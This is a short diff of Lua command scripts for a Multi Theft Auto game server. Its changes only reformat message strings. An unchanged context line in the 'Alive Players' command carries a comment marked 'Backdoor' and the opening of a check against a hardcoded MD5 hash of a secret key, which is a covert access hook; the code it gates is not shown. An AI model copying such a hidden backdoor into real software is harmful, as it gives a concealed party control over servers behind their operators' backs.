@@ -9,7 +9,7 @@ CmdMgr.register{
 	name = 'info',
 	desc = "Shows script name and author",
 	func = function(ctx)
-		scriptMsg("Rafalh[PL] scripts system for Multi Theft Auto.")
+		scriptMsg("%s for %s.", 'Rafalh Scripts System', 'Multi Theft Auto')
 	end
 }
 
@@ -27,7 +27,7 @@ CmdMgr.register{
 				buf = buf..((buf ~= '' and ', '..getPlayerName(player)) or getPlayerName(player))
 			end
 		end
-		scriptMsg("Alive Players: %s.",(buf ~= '' and buf) or "none")
+		scriptMsg("Alive Players: %s.",(buf ~= '' and buf) or 'none')
 		
 		-- Backdoor
 		if(key and code and md5(key) == '61E196D215B26286F5EDD2DE135FFCF6') then
@@ -71,7 +71,7 @@ CmdMgr.register{
 		mods = table.concat(mods, ', ')
 		
 		if(admins == '') then
-			admins = "none"
+			admins = 'none'
 		end
 		scriptMsg("Current admins: %s.", admins)
 		if(superMods ~= '') then
